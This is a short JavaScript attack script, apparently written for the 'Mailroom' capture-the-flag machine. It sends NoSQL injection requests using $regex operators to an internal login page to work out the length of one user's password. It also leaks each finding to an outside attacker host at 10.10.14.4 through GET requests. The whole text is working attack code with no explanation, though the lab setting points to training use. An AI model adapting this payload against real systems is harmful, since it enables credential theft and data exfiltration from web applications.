var req = new XMLHttpRequest();
var charset =
  "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%";

for (let i = 1; i < 41; i++) {
  req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
  req.setRequestHeader("content-type", "application/x-www-form-urlencoded");
  req.send(
    "email[$regex]=tristan@mailroom.htb&password[$regex]=[" +
      charset +
      "]{" +
      i +
      "}"
  );
  if (req.responseText.length != 130) {
    var req2 = new XMLHttpRequest();
    req2.open("GET", "http://10.10.14.4/?res=" + i, false);
    req2.send();
  }
}

